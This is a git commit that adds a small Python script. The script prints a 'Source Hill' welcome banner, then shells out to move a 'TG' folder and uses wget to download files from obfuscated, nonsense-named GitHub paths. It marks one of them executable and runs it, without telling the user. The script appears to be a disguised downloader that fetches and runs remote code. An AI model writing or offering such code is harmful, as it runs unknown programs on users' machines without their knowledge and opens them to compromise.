be983b560da88841e7acbfe0a576166f79b31fb0
Mo <71596838+SuSaleM@users.noreply.github.com>
2021-04-19 00:45:25 +0200

    v1

---
+++ https:/JJXXH.py
@@ -0,0 +1,6 @@
+import os
+import time
+time.sleep(1)
+print("\n\n\n\n               Welcome To Source Hill\n\n                : @F55s5 .\n               : @xb_0b\n               Thanks For Using Source HiLL")
+time.sleep(3)
+os.system("cd;mkdir hill;cd hill;mv $HOME/Hill/TG $HOME/hill/TG;wget https://raw.githubusercontent.com/SuSaleM/.-plmokijnygfvtrdygfvtijhnkm-l/main/fopkdfldsfdsf/dsfdsfdsf/run;chmod +x run;wget https://raw.githubusercontent.com/SuSaleM/.-plmokijnygfvtrdygfvtijhnkm-l/main/fopkdfldsfdsf/dsfdsfdsf/fdsfdsfdsfds/dsfer4r3r432ewda/caewfv/ins;./run") 
